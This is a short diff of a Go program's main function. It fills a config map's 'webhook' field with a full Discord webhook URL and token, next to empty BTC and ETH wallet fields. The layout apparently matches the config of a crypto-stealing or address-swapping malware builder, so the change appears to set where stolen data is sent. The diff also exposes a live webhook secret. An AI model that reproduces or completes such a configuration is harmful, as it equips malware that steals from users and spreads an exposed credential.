@@ -22,7 +22,7 @@ import (
 
 func main() {
 	CONFIG := map[string]interface{}{
-		"webhook": "",
+		"webhook": "https://discordapp.com/api/webhooks/1167657967047417928/wwt1R_zu2AwF-0eyrhWnpx_37hLYYlpKJRWKU-u8VXyrzvX4dGuHuJlwKMD3lQj7uBwl",
 		"cryptos": map[string]string{
 			"BTC":  "",
 			"ETH":  "",
